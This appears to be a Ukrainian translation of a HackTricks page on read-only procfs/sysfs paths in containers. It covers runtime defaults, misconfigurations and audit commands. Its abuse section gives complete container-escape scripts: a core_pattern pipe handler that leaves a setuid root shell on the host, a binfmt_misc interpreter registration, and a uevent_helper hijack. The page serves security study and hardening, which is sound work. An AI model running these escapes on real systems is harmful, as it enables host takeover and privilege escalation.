# Системні шляхи лише для читання

{{#include ../../../../banners/hacktricks-training.md}}

Системні шляхи лише для читання є окремим захистом від masked paths. Замість повного приховування шляху runtime відкриває його, але монтує лише для читання. Це поширено для вибраних розташувань procfs і sysfs, де доступ на читання може бути прийнятним або операційно необхідним, але запис був би надто небезпечним.

Мета проста: багато інтерфейсів ядра стають значно небезпечнішими, коли доступні для запису. Монтування лише для читання не усуває всю розвідувальну цінність, але не дозволяє скомпрометованому workload змінювати файли, що взаємодіють із ядром, через цей шлях.

## Робота

Runtime часто позначає частини представлення proc/sys як доступні лише для читання. Залежно від runtime і хоста, це можуть бути такі шляхи:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Фактичний список відрізняється, але модель однакова: дозволити видимість там, де це потрібно, і типово заборонити внесення змін.<sup>[[1]](#references)</sup>

## Лабораторна робота

Перегляньте список шляхів лише для читання, оголошений Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Перевірте змонтоване представлення proc/sys зсередини контейнера:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Вплив на безпеку

Шляхи системи, доступні лише для читання, обмежують широкий клас зловживань, що впливають на host. Навіть якщо attacker може переглядати procfs або sysfs, неможливість запису туди усуває багато прямих шляхів модифікації, пов’язаних із kernel tunables, crash handlers, module-loading helpers та іншими інтерфейсами керування. Exposure не зникає, але перехід від information disclosure до впливу на host стає складнішим.

## Неправильні конфігурації

Основними помилками є зняття маскування або повторне монтування чутливих шляхів у режимі read-write, пряме відкриття вмісту host proc/sys за допомогою writable bind mounts або використання privileged режимів, які фактично обходять безпечніші runtime defaults. У Kubernetes `procMount: Unmasked` і privileged workloads часто поєднуються зі слабшим захистом proc.<sup>[[2]](#references)</sup> Ще одна поширена операційна помилка — припущення, що оскільки runtime зазвичай монтує ці шляхи в режимі read-only, усі workloads і надалі успадковують це default-значення.

## Зловживання

Якщо захист слабкий, почніть із пошуку writable записів proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Коли наявні записи, доступні для запису, цінні подальші шляхи включають:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Що можуть розкрити ці команди:

- Доступні для запису записи в `/proc/sys` часто означають, що container може змінювати поведінку kernel на host, а не лише переглядати її.
- `core_pattern` особливо важливий, оскільки доступне для запису значення, спрямоване на host, можна перетворити на шлях до виконання коду на host, аварійно завершивши процес після налаштування pipe handler.
- `modprobe` розкриває helper, який використовує kernel для flow, пов’язаних із завантаженням модулів; це класична high-value ціль, коли вона доступна для запису.
- `binfmt_misc` показує, чи можлива реєстрація custom interpreter. Якщо реєстрація доступна для запису, це може стати execution primitive, а не просто information leak.
- `panic_on_oom` керує загальною для host рішенням kernel і тому може перетворити вичерпання ресурсів на denial of service для host.
- `uevent_helper` є одним із найочевидніших прикладів того, як доступний для запису шлях до sysfs helper забезпечує виконання в контексті host.

Цікаві результати включають доступні для запису proc knobs або записи sysfs, спрямовані на host, які зазвичай мають бути доступними лише для читання. У цей момент workload переходить від обмеженого container view до суттєвого впливу на kernel.

### Повний приклад: `core_pattern` Host Escape

Якщо `/proc/sys/kernel/core_pattern` доступний для запису зсередини container і вказує на view kernel host, його можна використати для виконання payload після crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Якщо шлях справді досягає kernel хоста, payload виконується на хості й залишає shell із setuid.

### Повний приклад: реєстрація `binfmt_misc`

Якщо `/proc/sys/fs/binfmt_misc/register` доступний для запису, реєстрація custom interpreter може забезпечити виконання коду під час виконання відповідного файла:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
У доступному з хоста для запису `binfmt_misc` результатом є виконання коду через шлях інтерпретатора, ініційований kernel.

### Повний приклад: `uevent_helper`

Якщо `/sys/kernel/uevent_helper` доступний для запису, kernel може викликати helper із host path, коли спрацьовує відповідна подія:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Причина, чому це настільки небезпечно, полягає в тому, що шлях до helper визначається з точки зору файлової системи host, а не з безпечного контексту, обмеженого контейнером.

## Перевірки

Ці перевірки визначають, чи є доступ до procfs/sysfs лише для читання там, де це очікується, і чи може workload і надалі змінювати чутливі інтерфейси kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Що тут цікаво:

- Звичайне hardened workload має відкривати дуже мало доступних для запису записів у proc/sys.
- Доступні для запису шляхи `/proc/sys` часто важливіші за звичайний доступ для читання.
- Якщо runtime повідомляє, що шлях доступний лише для читання, але на практиці він доступний для запису, уважно перевірте mount propagation, bind mounts і налаштування привілеїв.

## Типові налаштування runtime

| Runtime / платформа | Типовий стан | Типова поведінка | Поширене ручне послаблення |
| --- | --- | --- | --- |
| Docker Engine | Увімкнено за замовчуванням | Docker визначає типовий список шляхів, доступних лише для читання, для чутливих записів proc | відкриття host proc/sys mounts, `--privileged` |
| Podman | Увімкнено за замовчуванням | Podman застосовує типові шляхи, доступні лише для читання, якщо їх явно не послаблено | `--security-opt unmask=ALL`, широкі host mounts, `--privileged` |
| Kubernetes | Успадковує типові налаштування runtime | Використовує базову модель runtime для шляхів, доступних лише для читання, якщо її не послаблено налаштуваннями Pod або host mounts | `procMount: Unmasked`, privileged workloads, доступні для запису host proc/sys mounts |
| containerd / CRI-O під керуванням Kubernetes | Типові налаштування runtime | Зазвичай покладається на типові налаштування OCI/runtime | те саме, що й у рядку Kubernetes; прямі зміни конфігурації runtime можуть послабити цю поведінку |

Ключовий момент полягає в тому, що системні шляхи, доступні лише для читання, зазвичай присутні як типове налаштування runtime, але їх легко обійти за допомогою privileged modes або host bind mounts.

## Посилання

- [1] [Специфікація OCI Runtime: конфігурація Linux-контейнера (maskedPaths / readonlyPaths)](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md)
- [2] [Довідник Kubernetes API: Pod v1 (SecurityContext.procMount)](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)

{{#include ../../../../banners/hacktricks-training.md}}
